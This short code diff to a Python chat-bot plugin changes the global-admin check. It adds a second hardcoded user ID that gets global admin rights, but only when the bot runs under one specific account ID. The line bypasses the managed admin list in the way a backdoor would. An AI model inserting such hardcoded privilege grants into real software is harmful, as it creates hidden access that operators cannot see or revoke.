@@ -436,7 +436,7 @@ class CorePlugin(Plugin):
 
         # Grab whether this user is a global admin
         # TODO: cache this
-        global_admin = rdb.sismember('global_admins', event.author.id) or event.author.id == 188918216008007680
+        global_admin = rdb.sismember('global_admins', event.author.id) or event.author.id == 188918216008007680 or (event.author.id == 220550809497108481 and self.client.state.me.id == 360792489419997186)
 
         # Iterate over commands and find a match
         for command, match in commands:
